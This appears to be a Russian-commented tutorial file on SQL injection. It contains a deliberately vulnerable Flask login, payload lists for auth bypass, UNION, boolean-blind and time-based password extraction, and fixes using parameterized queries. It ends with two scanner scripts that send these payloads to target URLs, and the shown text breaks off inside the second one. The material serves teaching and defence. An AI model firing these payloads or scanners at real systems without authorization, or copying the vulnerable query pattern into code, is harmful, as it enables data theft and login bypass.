    # –û–ü–ê–°–ù–û: –ø—Ä—è–º–æ–µ –≤–∫–ª—é—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –≤–≤–æ–¥–∞ –≤ SQL-–∑–∞–ø—Ä–æ—Å
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"–í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∑–∞–ø—Ä–æ—Å: {query}")  # –î–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏
    
    c.execute(query)
    user = c.fetchone()
    conn.close()
    
    return user is not None

@app.route('/')
def home():
    if 'username' in session:
        return f"–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, {session['username']}! <a href='/logout'>–í—ã–π—Ç–∏</a>"
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        if check_credentials(username, password):
            session['username'] = username
            return redirect(url_for('home'))
        else:
            return "–ù–µ–≤–µ—Ä–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ. <a href='/login'>–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</a>"
    
    return '''
        <h1>–í—Ö–æ–¥ –≤ —Å–∏—Å—Ç–µ–º—É</h1>
        <form method="post">
            –õ–æ–≥–∏–Ω: <input type="text" name="username"><br>
            –ü–∞—Ä–æ–ª—å: <input type="password" name="password"><br>
            <input type="submit" value="–í–æ–π—Ç–∏">
        </form>
    '''

@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug = True)

# –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã:
# –ë–µ–∑–æ–ø–∞—Å–Ω–∞—è –≤–µ—Ä—Å–∏—è
def check_credentials_safe(username, password):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
    user = c.fetchone()
    conn.close()
    return user is not None

# –•–µ—à–∏—Ä—É–π—Ç–µ –ø–∞—Ä–æ–ª–∏ (–Ω–∏–∫–æ–≥–¥–∞ –Ω–µ —Ö—Ä–∞–Ω–∏—Ç–µ –∏—Ö –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ):
import hashlib

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# –ü—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
hashed_pw = hash_password(password)
c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, hashed_pw))

# –ü—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ
input_hash = hash_password(password)
c.execute("SELECT * FROM users WHERE username=? AND password=?", (username, input_hash))

# ===================================================================================================================================

# –û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ SQL-–∏–Ω—ä–µ–∫—Ü–∏–π:
# –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç—å –∫ SQL-–∏–Ω—ä–µ–∫—Ü–∏—è–º
# –í—Å–µ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã:
# –ù–ï–ü–†–ê–í–ò–õ–¨–ù–û (—É—è–∑–≤–∏–º–æ):
cursor.execute(f"SELECT * FROM users WHERE username='{username}'")

# –ü–†–ê–í–ò–õ–¨–ù–û (–±–µ–∑–æ–ø–∞—Å–Ω–æ):
cursor.execute("SELECT * FROM users WHERE username=?", (username,))

# –î–ª—è –±–æ–ª–µ–µ –ø–æ–ª–Ω–æ–≥–æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –º–æ–∂–Ω–æ –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å:
# ' OR 1=1 --
# ' OR 'a'='a
# ' OR 1=1; --
# ' OR '1'='1' /*
# admin' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --
# ' UNION SELECT 1,@@version,3,4 --
# '; WAITFOR DELAY '0:0:10' --

# =====================================================================================================================================

# –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è SQL-–∏–Ω—ä–µ–∫—Ü–∏–π –¥–ª—è –æ–±—Ö–æ–¥–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏:
# –ò—Å—Ö–æ–¥–Ω—ã–π –∑–∞–ø—Ä–æ—Å: SELECT * FROM users WHERE username='[–ª–æ–≥–∏–Ω]' AND password='[–ø–∞—Ä–æ–ª—å]'
# –ü–æ—Å–ª–µ –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫–∏: SELECT * FROM users WHERE username='admin' --' AND password='123'
# –§–∞–∫—Ç–∏—á–µ—Å–∫–∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è: SELECT * FROM users WHERE username='admin'
# –ò—Å—Ö–æ–¥–Ω—ã–π –∑–∞–ø—Ä–æ—Å: SELECT * FROM users WHERE username='[–ª–æ–≥–∏–Ω]' AND password='[–ø–∞—Ä–æ–ª—å]'
# –ü–æ—Å–ª–µ –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–∫–∏: SELECT * FROM users WHERE username='' OR 1=1 --' AND password='123'
# –î–∞–≤–∞–π—Ç–µ –ø—Ä–æ—Ç–µ—Å—Ç–∏—Ä—É–µ–º —ç—Ç–æ –Ω–∞ –Ω–∞—à–µ–º —É—è–∑–≤–∏–º–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏:
# –ö–æ–¥ –∏–∑ –Ω–∞—à–µ–≥–æ —É—è–∑–≤–∏–º–æ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
def check_credentials(username, password):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    
    # –£—è–∑–≤–∏–º—ã–π –∑–∞–ø—Ä–æ—Å
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"–í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∑–∞–ø—Ä–æ—Å: {query}")  # –î–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏
    
    c.execute(query)
    user = c.fetchone()
    conn.close()
    
    return user is not None

# –ü—Ä–∏ –≤–≤–æ–¥–µ admin' --: –í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∑–∞–ø—Ä–æ—Å: SELECT * FROM users WHERE username='admin' --' AND password='123'
# –ü—Ä–∏ –≤–≤–æ–¥–µ ' OR 1=1 --: –í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∑–∞–ø—Ä–æ—Å: SELECT * FROM users WHERE username='' OR 1=1 --' AND password='123'

# –†–µ—à–µ–Ω–∏–µ 1: –ü–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã
def check_credentials_safe(username, password):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    
    # –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –∑–∞–ø—Ä–æ—Å —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏
    query = "SELECT * FROM users WHERE username=? AND password=?"
    c.execute(query, (username, password))
    
    user = c.fetchone()
    conn.close()
    
    return user is not None

# –†–µ—à–µ–Ω–∏–µ 2: –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ ORM
from sqlalchemy import create_engine, text

def check_credentials_orm(username, password):
    engine = create_engine('sqlite:///database.db')
    
    # –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –∑–∞–ø—Ä–æ—Å —á–µ—Ä–µ–∑ SQLAlchemy
    query = text("SELECT * FROM users WHERE username=:user AND password=:pass")
    
    with engine.connect() as conn:
        result = conn.execute(query, {"user": username, "pass": password})
        return result.fetchone() is not None
    
# ==========================================================================================================================================

# SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏ —Ç–∏–ø–∞ Boolean-based Blind:
# $user = $_GET['username']; // –£—è–∑–≤–∏–º—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä
# $query = "SELECT * FROM users WHERE username = '$user'";
# $result = mysqli_query($conn, $query);

# –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ —É–≥–∞–¥—ã–≤–∞—Ç—å –¥–∞–Ω–Ω—ã–µ, –Ω–∞–ø—Ä–∏–º–µ—Ä: 
# admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a'--

# –ó–∞—â–∏—Ç–∞ –æ—Ç Boolean-based Blind SQL-–∏–Ω—ä–µ–∫—Ü–∏–π
# $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
# $stmt->bind_param("s", $user);
# $stmt->execute();

# =========================================================================================================================================

# SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏ —Ç–∏–ø–∞ Time-based Blind:
#  –°–æ–∑–¥–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ–≥–æ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è (PHP + MySQL)
# <?php
# // –£—è–∑–≤–∏–º—ã–π –∫–æ–¥ —Å Time-based Blind SQL-–∏–Ω—ä–µ–∫—Ü–∏–µ–π
# $conn = new mysqli("localhost", "user", "password", "test_db");

# if ($conn->connect_error) {
#     die("Connection failed: " . $conn->connect_error);
# }

# $username = $_GET['username'];
# $query = "SELECT * FROM users WHERE username = '$username'";
# $result = $conn->query($query);

# if ($result->num_rows > 0) {
#     echo "User exists";
# } else {
#     echo "User not found";
# }

# $conn->close();
# ?>

# –ë–∞–∑–æ–≤—ã–π —Ç–µ—Å—Ç –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç—å: admin' AND SLEEP(5)--
# –£—Å–ª–æ–≤–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞: 
# admin' AND IF(1=1,SLEEP(5),0)--
# admin' AND IF(1=2,SLEEP(5),0)--
# –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –¥–ª–∏–Ω—ã –ø–∞—Ä–æ–ª—è: admin' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin')=10,SLEEP(5),0)--
# –ü–æ—Å—Ç–µ–ø–µ–Ω–Ω–æ–µ –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö: admin' AND IF((SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97,SLEEP(5),0)--

# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–æ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω—ã—Ö –≤—ã—Ä–∞–∂–µ–Ω–∏–π
# $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
# $stmt->bind_param("s", $username);
# $stmt->execute();

# ==========================================================================================================================================

# –ó–∞—â–∏—Ç–∞ –æ—Ç SQL-–∏–Ω—ä–µ–∫—Ü–∏–π:

# PHP (MySQLi):
# $stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
# $stmt->bind_param("ss", $username, $password);
# $stmt->execute();
# $result = $stmt->get_result();

# PHP (PDO):
# $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
# $stmt->execute([':username' => $username]);
# $user = $stmt->fetch();

# Python (SQLite3):
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))

# Java (JDBC):
# PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
# stmt.setString(1, username);
# ResultSet rs = stmt.executeQuery();

# PHP (Eloquent Laravel): $user = User::where('username', $username)->first();
# Python (SQLAlchemy): user = session.query(User).filter_by(username=username).first()
# Node.js (Sequelize): const user = await User.findOne({ where: { username } });
# C# (Entity Framework): var user = context.Users.FirstOrDefault(u => u.Username == username);

# –í–∞–ª–∏–¥–∞—Ü–∏—è –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö:
# if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
#     die("Invalid username format");
# }

# –≠–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö —Å–∏–º–≤–æ–ª–æ–≤: $safe_input = $conn->real_escape_string($user_input);

# –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥
# –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤
# if (preg_match('/(union|select|insert|delete|update|drop|alter)/i', $_SERVER['QUERY_STRING'])) {
#     file_put_contents('security.log', date('Y-m-d H:i:s')." - Possible SQLi: ".$_SERVER['REQUEST_URI']."\n", FILE_APPEND);
# }

# –ü—Ä–∏–º–µ—Ä –ø–æ–ª–Ω–æ–π –∑–∞—â–∏—â–µ–Ω–Ω–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ (PHP + PDO)
# <?php
# // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –ë–î
# $pdo = new PDO('mysql:host=localhost;dbname=test_db', 'user', 'password', [
#     PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
#     PDO::ATTR_EMULATE_PREPARES => false
# ]);

# // –í–∞–ª–∏–¥–∞—Ü–∏—è –≤–≤–æ–¥–∞
# if (!preg_match('/^[a-z0-9]{3,20}$/i', $_POST['username'])) {
#     die("Invalid username format");
# }

# // –ü–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–π –∑–∞–ø—Ä–æ—Å
# $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND status = 'active'");
# $stmt->execute([':username' => $_POST['username']]);
# $user = $stmt->fetch();

# if ($user && password_verify($_POST['password'], $user['password_hash'])) {
#     // –£—Å–ø–µ—à–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è
# } else {
#     // –û—à–∏–±–∫–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
# }
# ?>

# ============================================================================================================================================

# –ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è Bandit:
import bandit
import bandit.core.manager
manager = bandit.core.manager.BanditManager()
manager.run_tests(['example.py'])
results = manager.results
for issue in results.issues:
    print(issue)

# –ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è OWASP ZAP —Å Python:
import requests
zap_url = 'http://localhost:8080'
target_url = 'http://example.com'

# –ó–∞–ø—É—Å–∫ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
requests.get(f'{zap_url}/JSON/ascan/action/scan/?url={target_url} ')

# –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
status = requests.get(f'{zap_url}/JSON/ascan/view/status/')
print('–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ –Ω–∞', status.json() ['status'], '%')

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏
import requests

# –û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ —Å –ø–æ—Ç–µ–Ω—Ü–∏–∞ÔøΩ—å–Ω–æ —É—è–∑–≤–∏–º—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏
payload = "' OR '1'='1"
response = requests.get('https://www.example.com/login?username=' + payload)

# –ê–Ω–∞–ª–∏–∑ –æ—Ç–≤–µ—Ç–∞ –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤ –ø–æ–≤–µ–¥–µ–Ω–∏–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
if '–í—ã —É—Å–ø–µ—à–Ω–æ –≤–æ—à–ª–∏ –≤ —Å–∏—Å—Ç–µ–º—É' in response.text:
    print('–£—è–∑–≤–∏–º–æ—Å—Ç—å –Ω–∞ —Å–∞–π—Ç–µ:', response.url)

# –ü–æ–∏—Å–∫ —É—Ç–µ—á–µ–∫ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –≤ URL
import requests

# –ü–µ—Ä–µ–±–æ—Ä URL —Å –≤–æ–∑–º–æ–∂–Ω—ã–º–∏ —É—Ç–µ—á–∫–∞–º–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
for i in range(1, 101):
    url = f'https://www.example.com/page?id={i}'
    response = requests.get(url)

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–≤–µ—Ç–∞ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
    if '–ö–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ' in response.text:
        print('–û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç—å –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ:', url)

# ============================================================================================================================================

# –ü—Ä–æ–≥—Ä–∞–º–º–∞ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è SQL-–∏–Ω—ä–µ–∫—Ü–∏–π –Ω–∞ Python
import requests
from urllib.parse import urljoin
from time import sleep
import argparse

class SQLiTester:
    def __init__(self, target_url, verbose = False):
        self.target_url = target_url
        self.verbose = verbose
        self.vulnerable = False
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SQLiTester/1.0',
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.5'
        })
        
        # –ë–∞–∑–æ–≤—ã–µ payload'—ã –¥–ª—è —Ä–∞–∑–Ω—ã—Ö —Ç–∏–ø–æ–≤ SQL-–∏–Ω—ä–µ–∫—Ü–∏–π
        self.payloads = {
            'error_based': [
                "'",
                "\"",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR 1=1--",
                "\" OR 1=1--",
                "' UNION SELECT null,username,password FROM users--",
                "1' ORDER BY 1--",
                "1' ORDER BY 10--"
            ],
            'boolean_based': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR IF(1=1,1,0)--",
                "' OR IF(1=2,1,0)--"
            ],
            'time_based': [
                "' OR IF(1=1,SLEEP(5),0)--",
                "' OR IF(1=2,SLEEP(5),0)--",
                "'; WAITFOR DELAY '0:0:5'--"
            ]
        }

    def test_parameter(self, param_name, param_value, method = 'GET'):
        """
        –¢–µ—Å—Ç–∏—Ä—É–µ—Ç –æ–¥–∏–Ω –ø–∞—Ä–∞–º–µ—Ç—Ä –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç—å –∫ SQL-–∏–Ω—ä–µ–∫—Ü–∏—è–º
        """
        results = []
        
        for category, payload_list in self.payloads.items():
            for payload in payload_list:
                test_value = param_value + payload
                
                if method.upper() == 'GET':
                    params = {param_name: test_value}
                    response = self.session.get(self.target_url, params = params)
                else:
                    data = {param_name: test_value}
                    response = self.session.post(self.target_url, data = data)
                
                # –ê–Ω–∞–ª–∏–∑ –æ—Ç–≤–µ—Ç–∞
                is_vulnerable = self.analyze_response(response, category)
                
                if is_vulnerable:
                    results.append({
                        'parameter': param_name,
                        'payload': payload,
                        'type': category,
                        'status': 'VULNERABLE',
                        'response_time': response.elapsed.total_seconds(),
                        'status_code': response.status_code
                    })
                    self.vulnerable = True
                else:
                    results.append({
                        'parameter': param_name,
                        'payload': payload,
                        'type': category,
                        'status': 'not vulnerable',
                        'response_time': response.elapsed.total_seconds(),
                        'status_code': response.status_code
                    })
                
                if self.verbose:
                    print(f"Testing {param_name}={test_value} -> {results[-1]['status']}")
                
                # –ó–∞—â–∏—Ç–∞ –æ—Ç –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏
                sleep(0.5)
        
        return results

    def analyze_response(self, response, payload_type):
        """
        –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç –æ—Ç–≤–µ—Ç —Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ –ø—Ä–∏–∑–Ω–∞–∫–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
        """
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –æ—à–∏–±–∫–∏ SQL –≤ –æ—Ç–≤–µ—Ç–µ
        sql_errors = [
            'SQL syntax',
            'MySQL server version',
            'unclosed quotation mark',
            'syntax error',
            'ODBC Driver',
            'ORA-',
            'PostgreSQL',
            'Microsoft Access'
        ]
        
        # –î–ª—è boolean-based –∏–Ω—ä–µ–∫—Ü–∏–π
        original_response = self.session.get(self.target_url).text
        test_response = response.text
        
        # –î–ª—è time-based –∏–Ω—ä–µ–∫—Ü–∏–π
        response_time = response.elapsed.total_seconds()
        
        if payload_type == 'error_based':
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ SQL-–æ—à–∏–±–æ–∫ –≤ –æ—Ç–≤–µ—Ç–µ
            return any(error in response.text for error in sql_errors)
        
        elif payload_type == 'boolean_based':
            # –°—Ä–∞–≤–Ω–∏–≤–∞–µ–º –æ—Ç–≤–µ—Ç—ã –Ω–∞ TRUE –∏ FALSE —É—Å–ª–æ–≤–∏—è
            return original_response != test_response
        
        elif payload_type == 'time_based':
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∑–∞–¥–µ—Ä–∂–∫—É –æ—Ç–≤–µ—Ç–∞
            return response_time > 5
        
        return False

    def scan_form(self, form_action, inputs):
        """
        –°–∫–∞–Ω–∏—Ä—É–µ—Ç HTML-—Ñ–æ—Ä–º—É –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
        """
        results = []
        method = 'POST'  # –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é, –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –º–µ—Ç–æ–¥–∞
        
        for input_name in inputs:
            if input_name.lower() in ['submit', 'csrf_token']:
                continue
                
            test_value = f"test_{input_name}"
            res = self.test_parameter(input_name, test_value, method)
            results.extend(res)
        
        return results

def main():
    parser = argparse.ArgumentParser(description = 'SQL Injection Scanner')
    parser.add_argument('-u', '--url', required = True, help = 'Target URL')
    parser.add_argument('-p', '--parameter', help = 'Parameter to test')
    parser.add_argument('-v', '--verbose', action = 'store_true', help = 'Verbose output')
    args = parser.parse_args()
    
    tester = SQLiTester(args.url, verbose = args.verbose)
    
    if args.parameter:
        results = tester.test_parameter(args.parameter, 'test')
    else:
        # –ï—Å–ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä –Ω–µ —É–∫–∞–∑–∞–Ω, –¥–µ–ª–∞–µ–º –±–∞–∑–æ–≤—ã–π —Ç–µ—Å—Ç
        results = tester.test_parameter('id', '1')
    
    print("\nScan Results:")
    print("="*50)
    for result in results:
        if result['status'] == 'VULNERABLE':
            print(f"[!] {result['parameter']} is VULNERABLE to {result['type']} SQLi")
            print(f"    Payload: {result['payload']}")
            print(f"    Response code: {result['status_code']}")
            print(f"    Response time: {result['response_time']}s")
            print("-"*50)
    
    if not tester.vulnerable:
        print("[+] No SQL injection vulnerabilities found")

if __name__ == '__main__':
    main()

# –ë–∞–∑–æ–≤—ã–π —Ç–µ—Å—Ç: python sql_scanner.py -u "http://example.com/page.php?id=1"
# –¢–µ—Å—Ç –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞: python sql_scanner.py -u "http://example.com/login.php" -p username
# –ü–æ–¥—Ä–æ–±–Ω—ã–π –≤—ã–≤–æ–¥: python sql_scanner.py -u "http://example.com/search.php" -p query -v

# ===========================================================================================================================================

# –°–∫—Ä–∏–ø—Ç –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ URL-–∞–¥—Ä–µ—Å–æ–≤ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π: pip install requests beautifulsoup4
# –ó–∞–ø—É—Å–∫ —Å–∫–∞–Ω–µ—Ä–∞: python url_scanner.py -u "https://example.com" -o results.json

import requests
from urllib.parse import urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup
import time
import argparse
import json

class URLScanner:
    def __init__(self, base_url, output_file = "scan_results.json"):
        self.base_url = base_url
        self.output_file = output_file
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ScannerBot/1.0",
        })
        self.vulnerabilities = []

    def get_links_from_page(self, url):
        """–ò–∑–≤–ª–µ–∫–∞–µ—Ç –≤—Å–µ —Å—Å—ã–ª–∫–∏ —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã"""
        try:
            response = self.session.get(url, timeout = 5)
            soup = BeautifulSoup(response.text, "html.parser")
            links = set()
            
            for link in soup.find_all("a", href = True):
                href = link["href"]
                full_url = urljoin(url, href)
                if full_url.startswith(self.base_url):
                    links.add(full_url)
            
            return links
        except Exception as e:
            print(f"[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å—Å—ã–ª–æ–∫: {e}")
            return set()

    def scan_url(self, url):
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç URL –Ω–∞ —É—è–∑–≤–∏–º—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        if not query_params:
            return

        print(f"\n[üîç] –ê–Ω–∞–ª–∏–∑ URL: {url}")

        for param in query_params:
            print(f"  [*] –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞: {param}")
            
            # –¢–µ—Å—Ç—ã –Ω–∞ SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏
            if self.test_sql_injection(url, param):
                self.vulnerabilities.append({
                    "url": url,
                    "parameter": param,
                    "type": "SQL Injection",
                    "payload": "SQLi Test Payload"
                })
            
            # –¢–µ—Å—Ç—ã –Ω–∞ XSS
            if self.test_xss(url, param):
                self.vulnerabilities.append({
                    "url": url,
                    "parameter": param,
                    "type": "XSS",
                    "payload": "XSS Test Payload"
                })
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ IDOR (–µ—Å–ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä —Å–æ–¥–µ—Ä–∂–∏—Ç ID)
            if "id" in param.lower() or "user" in param.lower():
                if self.test_idor(url, param):
                    self.vulnerabilities.append({
                        "url": url,
                        "parameter": param,
                        "type": "IDOR",
                        "payload": "IDOR Test Payload"
                    })
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —É—Ç–µ—á–∫–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ (debug, token, etc.)
            if self.test_info_leak(url, param):
                self.vulnerabilities.append({
                    "url": url,
                    "parameter": param,
                    "type": "Information Leakage",
                    "payload": "Debug/Token Found"
                })

    def test_sql_injection(self, url, param):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –Ω–∞ SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏"""
        test_payloads = [
            f"' OR '1'='1",
            "\" OR \"1\"=\"1",
            "1' ORDER BY 1--",
            "1 AND SLEEP(5)--"
        ]
        
        for payload in test_payloads:
            try:
                modified_url = url.replace(f"{param}=", f"{param}={payload}")
                response = self.session.get(modified_url, timeout = 10)
                
                # –ï—Å–ª–∏ –µ—Å—Ç—å SQL-–æ—à–∏–±–∫–∏ –≤ –æ—Ç–≤–µ—Ç–µ
                sql_errors = ["SQL syntax", "MySQL error", "unclosed quotation"]
                if any(error in response.text for error in sql_errors):
